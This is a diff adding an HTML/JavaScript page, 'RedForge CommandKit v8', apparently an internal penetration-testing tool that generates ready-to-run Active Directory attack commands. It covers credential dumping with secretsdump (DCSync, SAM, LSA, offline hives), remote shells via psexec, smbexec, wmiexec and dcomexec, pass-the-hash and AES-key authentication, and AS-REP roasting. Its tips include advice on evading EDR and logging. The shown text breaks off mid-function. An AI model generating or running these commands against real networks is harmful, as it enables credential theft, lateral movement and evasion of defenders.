@@ -1,0 +1,2023 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>RedForge CommandKit v8</title>
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline';">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --page:#f0f4f8;
+  --bg:#ffffff;
+  --bg2:#f0f4f8;
+  --bg3:#e8edf2;
+  --bg4:#dde3ea;
+  --border:#e2e8f0;
+  --border2:#c8d3de;
+  --text:#1a202c;
+  --text2:#4a5568;
+  --text3:#2d3748;
+  --text4:#718096;
+  --blue:#2563eb;
+  --blue-bg:#eff6ff;
+  --blue-border:#bfdbfe;
+  --green:#065f46;
+  --green-bg:#ecfdf5;
+  --green-border:#a7f3d0;
+  --amber:#92400e;
+  --amber-bg:#fffbeb;
+  --amber-border:#fcd34d;
+  --red:#991b1b;
+  --red-bg:#fef2f2;
+  --red-border:#fecaca;
+  --purple:#5b21b6;
+  --purple-bg:#f5f3ff;
+  --purple-border:#c4b5fd;
+  --term:#080d14;
+  --term-text:#d4e0f0;
+  --font-mono:"Cascadia Code","Fira Code","JetBrains Mono","Consolas",monospace;
+  --font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI","Inter",sans-serif;
+  --r:8px;--r-lg:12px;
+  --shadow:0 1px 3px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);
+  --shadow-md:0 4px 6px rgba(0,0,0,.05),0 2px 4px rgba(0,0,0,.04);
+}
+body{background:var(--page);color:var(--text);font-family:var(--font-sans);font-size:14px;min-height:100vh}
+
+/* ── topbar ── */
+.topbar{background:var(--bg);border-bottom:1px solid var(--border);padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between;height:56px;position:sticky;top:0;z-index:100;box-shadow:var(--shadow)}
+.brand{display:flex;align-items:center;gap:10px}
+.brand-logo{width:30px;height:30px;background:linear-gradient(135deg,#dc2626,#ef4444);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#fff;letter-spacing:-.5px;flex-shrink:0;box-shadow:0 2px 4px rgba(220,38,38,.3)}
+.brand-name{font-size:16px;font-weight:700;letter-spacing:-.02em;color:var(--text)}
+.brand-sub{font-size:11px;color:var(--text4);margin-top:-2px}
+.topbar-tags{display:flex;gap:6px;align-items:center}
+.tag{font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;letter-spacing:.02em}
+.tag-green{background:var(--green-bg);color:var(--green);border:1px solid var(--green-border)}
+.tag-red{background:var(--red-bg);color:var(--red);border:1px solid var(--red-border)}
+.vbadge{font-size:10px;padding:2px 7px;border-radius:4px;background:#fef9c3;color:#854d0e;border:1px solid #fde047;font-weight:700;margin-left:4px}
+
+/* ── os tabs ── */
+.tabs{background:var(--bg);border-bottom:1px solid var(--border);padding:0 1.5rem;display:flex}
+.os-tab{padding:12px 20px;background:transparent;color:var(--text4);cursor:pointer;font-size:13px;font-weight:500;border:none;border-bottom:2px solid transparent;font-family:var(--font-sans);transition:all .15s;margin-bottom:-1px;display:flex;align-items:center;gap:7px}
+.os-tab:hover{color:var(--text2)}
+.os-tab.t-linux{color:var(--blue);border-bottom-color:var(--blue);font-weight:600}
+.os-tab.t-win{color:var(--purple);border-bottom-color:var(--purple);font-weight:600}
+
+/* ── layout ── */
+.layout{display:grid;grid-template-columns:240px 1fr;gap:0;min-height:calc(100vh - 96px)}
+
+/* ── sidebar ── */
+.sidebar{background:var(--bg);border-right:1px solid var(--border);padding:.75rem .5rem;position:sticky;top:96px;max-height:calc(100vh - 96px);overflow-y:auto}
+.sidebar-hdr{font-size:11px;font-weight:600;color:var(--text4);text-transform:uppercase;letter-spacing:.08em;padding:4px 10px 8px}
+.tool-btn{width:100%;padding:7px 10px;border:1px solid transparent;border-radius:var(--r);background:transparent;color:var(--text2);cursor:pointer;font-size:13px;text-align:left;font-family:var(--font-sans);transition:all .12s;display:flex;align-items:center;gap:7px;line-height:1.3;margin-bottom:2px}
+.tool-btn:hover{background:var(--bg2);color:var(--text);border-color:var(--border)}
+.tool-btn.sel-linux{background:var(--blue-bg);color:var(--blue);border-color:var(--blue-border);font-weight:600}
+.tool-btn.sel-win{background:var(--purple-bg);color:var(--purple);border-color:var(--purple-border);font-weight:600}
+.t-dot{width:6px;height:6px;border-radius:50%;background:currentColor;opacity:.4;flex-shrink:0}
+
+/* ── main ── */
+.main{padding:1.5rem;display:flex;flex-direction:column;gap:1.125rem}
+
+/* ── cards ── */
+.card{background:var(--bg);border:1px solid var(--border);border-radius:var(--r-lg);overflow:hidden;box-shadow:var(--shadow)}
+.card-hdr{padding:.75rem 1.25rem;border-bottom:1px solid var(--border);background:var(--bg2);display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;color:var(--text3)}
+.card-body{padding:1.25rem}
+
+/* ── credential fields ── */
+.cred-grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem}
+.frow{display:flex;flex-direction:column;gap:5px}
+.flabel{font-size:11px;font-weight:600;color:var(--text4);text-transform:uppercase;letter-spacing:.06em}
+.finput{padding:8px 11px;background:var(--bg);border:1.5px solid var(--border2);border-radius:var(--r);color:var(--text);font-size:13px;font-family:var(--font-mono);width:100%;transition:border .12s}
+.finput:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 3px rgba(37,99,235,.08)}
+.finput::placeholder{color:#a0aec0;font-family:var(--font-sans);font-size:12px}
+.cred-note{margin-top:.875rem;padding:.625rem 1rem;background:var(--blue-bg);border:1px solid var(--blue-border);border-radius:var(--r);font-size:12px;color:#1e40af;display:flex;align-items:flex-start;gap:8px;line-height:1.5}
+
+/* ── pills ── */
+.pills{display:flex;flex-wrap:wrap;gap:6px}
+.pill{padding:5px 13px;border:1.5px solid var(--border2);border-radius:20px;background:var(--bg);color:var(--text2);cursor:pointer;font-size:12px;font-family:var(--font-sans);font-weight:500;transition:all .12s}
+.pill:hover{border-color:var(--border2);color:var(--text);background:var(--bg2)}
+.pill.sel-linux{background:var(--blue-bg);color:var(--blue);border-color:var(--blue-border);font-weight:600}
+.pill.sel-win{background:var(--purple-bg);color:var(--purple);border-color:var(--purple-border);font-weight:600}
+
+/* ── extras ── */
+.egrid{display:grid;grid-template-columns:1fr 1fr;gap:.625rem}
+.cb-row{display:flex;align-items:flex-start;gap:8px;padding:4px 0;cursor:pointer}
+.cb-row input[type=checkbox]{accent-color:var(--blue);width:14px;height:14px;flex-shrink:0;cursor:pointer;margin-top:3px}
+.cb-label{display:flex;flex-direction:column;gap:2px;cursor:pointer}
+.cb-main{font-size:13px;color:var(--text);font-weight:500}
+.cb-desc{font-size:11px;color:var(--text4);line-height:1.4}
+.ef-field{display:flex;flex-direction:column;gap:4px}
+.ef-label{font-size:11px;font-weight:600;color:var(--text4);text-transform:uppercase;letter-spacing:.05em}
+.ef-desc{font-size:11px;color:var(--text4);line-height:1.4;margin-bottom:1px}
+.ef-input{padding:7px 10px;background:var(--bg);border:1.5px solid var(--border2);border-radius:var(--r);color:var(--text);font-size:12px;font-family:var(--font-mono);transition:border .12s}
+.ef-input:focus{outline:none;border-color:var(--blue)}
+.ef-input::placeholder{color:#a0aec0;font-family:var(--font-sans)}
+
+/* ── generate button ── */
+.gen-btn{padding:10px 26px;border-radius:var(--r);cursor:pointer;font-size:13px;font-weight:600;font-family:var(--font-sans);display:inline-flex;align-items:center;gap:8px;transition:all .15s;border:1.5px solid;letter-spacing:.01em}
+.gen-linux{background:var(--blue);color:#fff;border-color:var(--blue);box-shadow:0 1px 4px rgba(37,99,235,.3)}
+.gen-linux:hover{background:#1d4ed8;box-shadow:0 2px 8px rgba(37,99,235,.35)}
+.gen-win{background:var(--purple);color:#fff;border-color:var(--purple);box-shadow:0 1px 4px rgba(91,33,182,.3)}
+.gen-win:hover{background:#4c1d95}
+
+/* ── output ── */
+.out-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--r-lg);overflow:hidden;box-shadow:var(--shadow-md)}
+.out-hdr{display:flex;align-items:center;justify-content:space-between;padding:.75rem 1.25rem;background:var(--bg2);border-bottom:1px solid var(--border)}
+.out-label{font-size:12px;font-weight:600;color:var(--text3);display:flex;align-items:center;gap:7px}
+.out-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px rgba(34,197,94,.5)}
+.copy-btn{padding:5px 14px;background:var(--bg);border:1.5px solid var(--border2);border-radius:6px;color:var(--text2);cursor:pointer;font-size:12px;font-family:var(--font-sans);font-weight:500;transition:all .12s}
+.copy-btn:hover{border-color:var(--blue);color:var(--blue);background:var(--blue-bg)}
+.out-body{padding:1.25rem 1.5rem;background:var(--term)}
+.out-body pre{font-family:var(--font-mono);font-size:13px;color:var(--term-text);white-space:pre-wrap;word-break:break-all;line-height:2}
+.tip-bar{padding:.625rem 1.25rem;background:var(--amber-bg);border-top:1px solid var(--amber-border);font-size:12px;color:var(--amber);line-height:1.6}
+
+/* ── empty state ── */
+.empty-wrap{padding:3rem 1.25rem;text-align:center;color:var(--text4)}
+.empty-icon{font-size:32px;margin-bottom:.875rem;opacity:.35}
+.empty-title{font-size:14px;font-weight:600;color:var(--text3);margin-bottom:.375rem}
+.empty-sub{font-size:13px;line-height:1.6;max-width:400px;margin:0 auto}
+
+/* ── responsive ── */
+@media(max-width:720px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{position:static;max-height:none;border-right:none;border-bottom:1px solid var(--border)}
+  .cred-grid,.egrid{grid-template-columns:1fr}
+  .topbar-tags .tag-green{display:none}
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="brand">
+    <div class="brand-logo">RF</div>
+    <div>
+      <div class="brand-name">RedForge <span style="color:var(--blue)">CommandKit</span><span class="vbadge">v8</span></div>
+      <div class="brand-sub">Internal Penetration Testing Reference &mdash; Verified Syntax</div>
+    </div>
+  </div>
+  <div class="topbar-tags">
+    <span class="tag tag-green">&#9679; Offline &middot; Zero Network Requests</span>
+    <span class="tag tag-red">&#128274; Internal Use Only</span>
+  </div>
+</div>
+
+<div class="tabs">
+  <button class="os-tab t-linux" id="tab-linux" onclick="switchOS('linux',this)">&#128039; Linux / Cross-Platform</button>
+  <button class="os-tab" id="tab-win" onclick="switchOS('windows',this)">&#128759; Windows Tools</button>
+</div>
+
+<div class="layout">
+  <div class="sidebar">
+    <div class="sidebar-hdr">Tools</div>
+    <div id="tool-list"></div>
+  </div>
+
+  <div class="main">
+
+    <!-- credentials -->
+    <div class="card">
+      <div class="card-hdr">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
+        Credentials &amp; Targets
+      </div>
+      <div class="card-body">
+        <div class="cred-grid">
+          <div class="frow"><div class="flabel">Username</div><input class="finput" id="f_user" placeholder="administrator" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">Password</div><input class="finput" id="f_pass" placeholder="Password123!" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">NT Hash (PTH)</div><input class="finput" id="f_hash" placeholder="aad3b435...:8846f7ea..." autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">AES256 Key</div><input class="finput" id="f_aes" placeholder="64 hex chars (from secretsdump)" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">Domain (FQDN)</div><input class="finput" id="f_domain" placeholder="corp.local" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">DC IP</div><input class="finput" id="f_dc" placeholder="192.168.1.10" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">DC Hostname (FQDN)</div><input class="finput" id="f_dch" placeholder="dc01.corp.local" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">Target Host</div><input class="finput" id="f_target" placeholder="192.168.1.20 or hostname" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">Attacker IP (LHOST)</div><input class="finput" id="f_lhost" placeholder="10.10.14.1" autocomplete="off" spellcheck="false"></div>
+          <div class="frow"><div class="flabel">Attacker Port (LPORT)</div><input class="finput" id="f_lport" placeholder="4444" autocomplete="off" spellcheck="false"></div>
+        </div>
+        <div class="cred-note">
+          <span>&#9432;</span>
+          <span>Fill in what you have &mdash; <strong>AES256 key</strong> takes priority over NT hash over password. The tool automatically picks the strongest available credential for each command. <strong>DC IP</strong> is used for <code>-dc-ip</code> flags; <strong>DC Hostname</strong> is used wherever Kerberos requires a resolvable name (e.g. <code>-k -no-pass</code> targets, <code>krb5.conf kdc</code>).</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- module select -->
+    <div class="card" id="module-card" style="display:none">
+      <div class="card-hdr">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+        Select Module / Attack
+      </div>
+      <div class="card-body"><div class="pills" id="pill-grid"></div></div>
+    </div>
+
+    <!-- options -->
+    <div class="card" id="extras-card" style="display:none">
+      <div class="card-hdr">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
+        Options
+      </div>
+      <div class="card-body"><div class="egrid" id="extras-grid"></div></div>
+    </div>
+
+    <div>
+      <button class="gen-btn gen-linux" id="gen-btn" onclick="generate()">&#9654; Generate Command</button>
+    </div>
+
+    <!-- output -->
+    <div class="out-card" id="out-wrap" style="display:none">
+      <div class="out-hdr">
+        <div class="out-label"><span class="out-dot"></span>Generated Command</div>
+        <button class="copy-btn" id="copy-btn" onclick="copyCmd()">Copy</button>
+      </div>
+      <div class="out-body"><pre id="out-pre"></pre></div>
+      <div class="tip-bar" id="tip-bar"></div>
+    </div>
+
+    <!-- empty state -->
+    <div id="empty-state">
+      <div class="empty-wrap">
+        <div class="empty-icon">&#128737;</div>
+        <div class="empty-title">Select a tool from the sidebar to get started</div>
+        <div class="empty-sub">All commands verified against official documentation. impacket v0.14 &middot; certipy v5 &middot; nxc latest &middot; bloodyAD v2.x &middot; Rubeus v2.3.3</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+
+<script>
+// RedForge CommandKit v8 — All syntax verified against official repos
+// Zero network requests. Fully offline. Safe on air-gapped machines.
+// Credential priority: AES256 > NT Hash > Password
+// v7 changes: DC IP / DC Hostname split; addcomputer/GetNPUsers/GetUserSPNs double-domain fix;
+//             secretsdump -lsa / -just-dc-user / offline hive mode added;
+//             nxc coerce_plus module added (scan + targeted methods)
+
+// ── Auth helpers ─────────────────────────────────────────────────────────────
+function ia(f){
+  // impacket: domain/user:pass@target or -hashes LM:NT
+  if(f.hash){let h=f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`;return`${f.domain?f.domain+"/":""}${f.user||"user"} -hashes ${h}`;}
+  if(f.domain)return`${f.domain}/${f.user||"user"}:'${f.pass||""}'`;
+  return`${f.user||"user"}:'${f.pass||""}'`;
+}
+function ia_aes(f){
+  // impacket with AES priority
+  if(f.aes)return`${f.domain?f.domain+"/":""}${f.user||"user"} -aesKey ${f.aes}`;
+  return ia(f);
+}
+function na(f){
+  // nxc: -u user (-H hash | -p pass) [-d domain]
+  let c=f.hash?`-H ${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}`:`-p '${f.pass||""}'`;
+  return[`-u '${f.user||"user"}'`,c,f.domain?`-d ${f.domain}`:""].filter(Boolean).join(" ");
+}
+function ca(f){
+  // certipy: -u user@domain (-p pass | -hashes | -aesKey)
+  let u=`-u '${f.user||"user"}@${f.domain||"corp.local"}'`;
+  let c=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash}`:`-p '${f.pass||""}'`;
+  return`${u} ${c}`;
+}
+function ba(f){
+  // bloodyAD: -u user (-p pass | -p LM:NT)
+  let c=f.hash?`-p '${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}'`:`-p '${f.pass||""}'`;
+  return`-u '${f.user||"user"}' ${c}`;
+}
+function er(m){return`[ERROR] ${m} — fill in the required field above`;}
+function fc(f){
+  // findComment — commented certipy find step 0
+  let d=f.domain||"corp.local",dc=f.dc||"DC_IP",u=f.user||"user";
+  let c=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash}`:`-p '${f.pass||""}'`;
+  return`# Step 0: Run certipy find first to get CA name and template name\n# certipy find -u '${u}@${d}' ${c} -dc-ip ${dc} -vulnerable -text\n# Fill in -ca and -template fields below from the output\n`;
+}
+function kerbnote(){
+  return`\n# NOTE: Using Kerberos (-k -no-pass) requires KRB5CCNAME to be set\n# Run the "Kerberos Setup" section first if you haven't already\n`;
+}
+
+const T={
+linux:{
+"kerb-setup":{label:"Kerberos Setup",mods:{
+"clock-sync":{label:"clock sync (ntpdate)",
+tip:"Kerberos requires clock skew < 5 minutes. Always sync before requesting tickets or you will get KRB_AP_ERR_SKEW errors.",
+extra:[
+{id:"method",type:"cb",main:"use rdate instead of ntpdate",desc:"rdate alternative — use if ntpdate is not installed on your system"}
+],
+build(f,e){let dc=f.dc;if(!dc)return er("DC IP");
+if(e.method)return`sudo rdate -n ${dc}\n# Verify sync:\ndate && net time -q //${dc}`;
+return`sudo ntpdate ${dc}\n# or if ntpdate not installed:\nsudo timedatectl set-ntp off && sudo ntpdate -u ${dc}\n# Verify:\ndate`;}},
+
+"krb5conf":{label:"generate krb5.conf",
+tip:"Required for Linux Kerberos tools. Paste output into /etc/krb5.conf. Uses domain and DC IP from credentials above.",
+extra:[
+{id:"extras",type:"cb",main:"include extra realms config",desc:"Adds forwardable=true and rdns=false — recommended for impacket compatibility"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain (FQDN)");let dc=f.dc;if(!dc)return er("DC IP");
+let realm=d.toUpperCase();
+let base=`[libdefaults]\n    default_realm = ${realm}\n    dns_lookup_realm = false\n    dns_lookup_kdc = false\n    ticket_lifetime = 24h\n    renew_lifetime = 7d`;
+if(e.extras)base+=`\n    forwardable = true\n    rdns = false`;
+return`# Contents for /etc/krb5.conf:\n# sudo nano /etc/krb5.conf  (or copy-paste below)\n\n${base}\n\n[realms]\n    ${realm} = {\n        kdc = ${dc}\n        admin_server = ${dc}\n    }\n\n[domain_realm]\n    .${d} = ${realm}\n    ${d} = ${realm}`;}},
+
+"getTGT":{label:"getTGT — request TGT",
+tip:"Request TGT and save as .ccache. AES key > NT hash > password. Always export KRB5CCNAME after.",
+extra:[
+{id:"dc_flag",type:"cb",main:"specify -dc-ip explicitly",desc:"Add -dc-ip flag — needed if /etc/krb5.conf is not configured or DNS is not resolving the DC"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");if(!f.user)return er("username");let dc=f.dc;
+let cred=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${f.pass||""}'`;
+let dcflag=(e.dc_flag&&dc)?` -dc-ip ${dc}`:"";
+return`impacket-getTGT ${d}/${f.user} ${cred}${dcflag}\nexport KRB5CCNAME=${f.user}.ccache`;}},
+
+"full-setup":{label:"full Kerberos setup chain",
+tip:"All steps in one block: sync clock, write krb5.conf, get TGT, export ccache. Copy-paste and run top to bottom.",
+extra:[],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");if(!f.user)return er("username");
+let realm=d.toUpperCase();
+let cred=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${f.pass||""}'`;
+return[
+`# ─── Full Kerberos Setup ──────────────────────────────────────`,``,
+`# Step 1: Sync clock with DC (prevents KRB_AP_ERR_SKEW)`,
+`sudo ntpdate ${dc}`,``,
+`# Step 2: Write krb5.conf`,
+`sudo tee /etc/krb5.conf << 'KRB5EOF'`,
+`[libdefaults]`,
+`    default_realm = ${realm}`,
+`    dns_lookup_realm = false`,
+`    dns_lookup_kdc = false`,
+`    forwardable = true`,
+`    rdns = false`,
+``,
+`[realms]`,
+`    ${realm} = {`,
+`        kdc = ${dc}`,
+`        admin_server = ${dc}`,
+`    }`,
+``,
+`[domain_realm]`,
+`    .${d} = ${realm}`,
+`    ${d} = ${realm}`,
+`KRB5EOF`,``,
+`# Step 3: Request TGT`,
+`impacket-getTGT ${d}/${f.user} ${cred} -dc-ip ${dc}`,``,
+`# Step 4: Export ccache`,
+`export KRB5CCNAME=${f.user}.ccache`,``,
+`# Step 5: Verify ticket`,
+`klist`
+].join("\n");}},
+}},
+
+"impacket":{label:"Impacket",mods:{
+"secretsdump":{label:"secretsdump",
+tip:"Dump SAM/NTDS/LSA remotely. Single-dash flags (-just-dc not --just-dc). AES key supported for opsec.",
+extra:[
+{id:"jdc",type:"cb",main:"-just-dc",desc:"Domain hashes only via DRSUAPI — skips SAM and LSA, much faster on DCs"},
+{id:"jdcntlm",type:"cb",main:"-just-dc-ntlm",desc:"NT hashes only — no Kerberos keys output, fastest option"},
+{id:"jdcuser",type:"tx",label:"-just-dc-user (single account)",desc:"DCSync a single account only — much stealthier than full -just-dc dump (e.g. krbtgt, Administrator)",ph:"krbtgt"},
+{id:"lsa",type:"cb",main:"-lsa (LSA secrets)",desc:"LSA secrets: service account passwords, DCC2 cached creds, DefaultPassword, DPAPI machine keys. Best for member servers"},
+{id:"hist",type:"cb",main:"-history",desc:"Include password history — useful for cracking and password pattern analysis"},
+{id:"sam",type:"cb",main:"-sam",desc:"Local SAM only — use on member servers, not DCs"},
+{id:"vss",type:"cb",main:"-use-vss",desc:"VSS (volume shadow copy) method — bypasses locked NTDS.dit, evades some EDR"},
+{id:"nopass",type:"cb",main:"-no-pass (use ccache)",desc:"Kerberos auth — requires KRB5CCNAME set. Run Kerberos Setup first"},
+{id:"out",type:"tx",label:"-outputfile",desc:"Save output to file — appends .ntds/.sam/.secrets extension automatically",ph:"output"},
+{id:"offline",type:"cb",main:"offline hive mode (local files)",desc:"Parse locally-obtained registry hives — set paths below. No target needed. Run: reg save HKLM\\SAM sam.hiv etc."},
+{id:"ofsam",type:"tx",label:"-sam (offline hive path)",desc:"Path to SAM hive file — from 'reg save HKLM\\SAM sam.hiv'",ph:"/tmp/sam.hiv"},
+{id:"ofsys",type:"tx",label:"-system (offline hive path)",desc:"Path to SYSTEM hive — REQUIRED for offline mode (contains boot key)",ph:"/tmp/system.hiv"},
+{id:"ofsec",type:"tx",label:"-security (offline hive path)",desc:"Path to SECURITY hive — for LSA secrets in offline mode",ph:"/tmp/security.hiv"}
+],
+build(f,e){
+if(e.offline){
+let sam=e.ofsam||"/tmp/sam.hiv",sys=e.ofsys||"/tmp/system.hiv";
+let fl=`-sam ${sam} -system ${sys}`;if(e.ofsec)fl+=` -security ${e.ofsec}`;
+return`# Offline hive mode — no target or credentials needed\nimpacket-secretsdump ${fl} LOCAL`;}
+let a=ia_aes(f),t=f.target||f.dc;if(!t)return er("target or DC IP");
+let fl="";if(e.jdc)fl+=" -just-dc";if(e.jdcntlm)fl+=" -just-dc-ntlm";if(e.jdcuser)fl+=` -just-dc-user ${e.jdcuser}`;if(e.lsa)fl+=" -lsa";if(e.hist)fl+=" -history";if(e.sam)fl+=" -sam";if(e.vss)fl+=" -use-vss";if(e.nopass)fl+=" -no-pass";if(e.out)fl+=` -outputfile ${e.out}`;
+return`impacket-secretsdump ${a}@${t}${fl}`;}},
+
+"psexec":{label:"psexec",
+tip:"SYSTEM shell via SMB. Uploads RemComSvc to ADMIN$. Loud — creates service and writes to disk.",
+extra:[
+{id:"port",type:"tx",label:"port",desc:"SMB port — 445 (default) or 139 for legacy targets",ph:"445"},
+{id:"nopass",type:"cb",main:"-no-pass (Kerberos)",desc:"Use KRB5CCNAME ccache — run Kerberos Setup first. Target must be hostname not IP"},
+{id:"codec",type:"tx",label:"-codec",desc:"Output encoding — utf-8 default. Change for non-English OS",ph:"utf-8"}
+],
+build(f,e){let a=ia_aes(f),t=f.target;if(!t)return er("target IP");
+let fl="";if(e.port)fl+=` -port ${e.port}`;if(e.nopass)fl+=" -no-pass";if(e.codec)fl+=` -codec ${e.codec}`;
+return`impacket-psexec ${a}@${t}${fl}`;}},
+
+"smbexec":{label:"smbexec",
+tip:"Shell via SMB service creation. No binary upload — writes bat file only. Stealthier than psexec.",
+extra:[
+{id:"svc",type:"tx",label:"-service-name",desc:"Service name — random by default. Change to blend in (e.g. WindowsUpdate)",ph:"WindowsUpdate"},
+{id:"ps",type:"cb",main:"-shell-type powershell",desc:"Use PowerShell instead of cmd.exe"},
+{id:"nopass",type:"cb",main:"-no-pass (Kerberos)",desc:"Use KRB5CCNAME ccache"}
+],
+build(f,e){let a=ia_aes(f),t=f.target;if(!t)return er("target IP");
+let fl="";if(e.svc)fl+=` -service-name ${e.svc}`;if(e.ps)fl+=" -shell-type powershell";if(e.nopass)fl+=" -no-pass";
+return`impacket-smbexec ${a}@${t}${fl}`;}},
+
+"wmiexec":{label:"wmiexec",
+tip:"WMI semi-interactive shell. No service or binary on disk. Stealthiest exec method.",
+extra:[
+{id:"nooutput",type:"cb",main:"-nooutput",desc:"Fire-and-forget — no output retrieved, no SMB connection back to attacker"},
+{id:"sil",type:"cb",main:"-silentcommand",desc:"No cmd.exe wrapper — direct execution, less logging in Windows event logs"},
+{id:"ps",type:"cb",main:"-shell-type powershell",desc:"PowerShell shell instead of cmd.exe"},
+{id:"codec",type:"tx",label:"-codec",desc:"Output encoding — run 'chcp.com' on target to find correct codepage",ph:"utf-8"},
+{id:"nopass",type:"cb",main:"-no-pass (Kerberos)",desc:"Use KRB5CCNAME ccache — target must be hostname"}
+],
+build(f,e){let a=ia_aes(f),t=f.target;if(!t)return er("target IP");
+let fl="";if(e.nooutput)fl+=" -nooutput";if(e.sil)fl+=" -silentcommand";if(e.ps)fl+=" -shell-type powershell";if(e.codec)fl+=` -codec ${e.codec}`;if(e.nopass)fl+=" -no-pass";
+return`impacket-wmiexec ${a}@${t}${fl}`;}},
+
+"atexec":{label:"atexec",
+tip:"Execute single command via Task Scheduler. Output retrieved as file. Non-interactive.",
+extra:[
+{id:"cmd",type:"tx",label:"command",desc:"Command to execute — wrap in quotes if it contains spaces",ph:"whoami /all"},
+{id:"codec",type:"tx",label:"-codec",desc:"Output encoding for non-English targets",ph:"utf-8"}
+],
+build(f,e){let a=ia_aes(f),t=f.target;if(!t)return er("target IP");
+return`impacket-atexec ${a}@${t} '${e.cmd||"whoami"}'${e.codec?` -codec ${e.codec}`:""}`;}},
+
+"dcomexec":{label:"dcomexec",
+tip:"Semi-interactive shell via DCOM. Three objects: ShellWindows, MMC20.Application, ShellBrowserWindow.",
+extra:[
+{id:"obj",type:"tx",label:"-object",desc:"DCOM object: ShellWindows (most reliable), MMC20.Application, ShellBrowserWindow",ph:"ShellWindows"},
+{id:"cmd",type:"tx",label:"command",desc:"Command to run — leave empty for interactive shell",ph:"whoami"},
+{id:"nopass",type:"cb",main:"-no-pass (Kerberos)",desc:"Use KRB5CCNAME ccache"}
+],
+build(f,e){let a=ia_aes(f),t=f.target;if(!t)return er("target IP");
+return`impacket-dcomexec -object ${e.obj||"ShellWindows"} ${a}@${t} '${e.cmd||"whoami"}'${e.nopass?" -no-pass":""}`;}},
+
+"lookupsid":{label:"lookupsid",
+tip:"Enumerate domain users/groups by brute-forcing SIDs. Works without LDAP access.",
+extra:[
+{id:"maxrid",type:"tx",label:"-maxrid",desc:"Highest RID to try — increase from 4000 for large domains",ph:"4000"}
+],
+build(f,e){let a=ia_aes(f),t=f.target||f.dc;if(!t)return er("target IP");
+return`impacket-lookupsid ${a}@${t}${e.maxrid?` -maxrid ${e.maxrid}`:""}`;}},
+
+"rpcdump":{label:"rpcdump",
+tip:"Dump all RPC endpoint UUIDs. Look for MS-RPRN, MS-EFSRPC, MS-DFSNM to identify coercion targets.",
+extra:[
+{id:"port",type:"tx",label:"-port",desc:"Epmapper port — 135 (TCP) or 445 (SMB named pipe)",ph:"135"}
+],
+build(f,e){let a=ia_aes(f),t=f.target||f.dc;if(!t)return er("target IP");
+return`impacket-rpcdump ${a}@${t}${e.port?` -port ${e.port}`:""}`;}},
+
+"GetNPUsers":{label:"GetNPUsers (ASREPRoast)",
+tip:"Find accounts with pre-auth disabled and grab AS-REP hashes. No creds needed with -no-pass + -usersfile.",
+extra:[
+{id:"ufile",type:"tx",label:"-usersfile",desc:"File of usernames — one per line. Without this, queries all domain users (needs creds)",ph:"/tmp/users.txt"},
+{id:"fmt",type:"tx",label:"-format",desc:"Hash format: hashcat (default, -m 18200) or john",ph:"hashcat"},
+{id:"nopass",type:"cb",main:"-no-pass (no creds needed)",desc:"Anonymous query — combine with -usersfile. No credentials required"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let fl=`-dc-ip ${dc}`;if(e.ufile)fl+=` -usersfile ${e.ufile}`;else fl+=" -request";if(e.fmt)fl+=` -format ${e.fmt||"hashcat"}`;
+let u=f.user||"user";
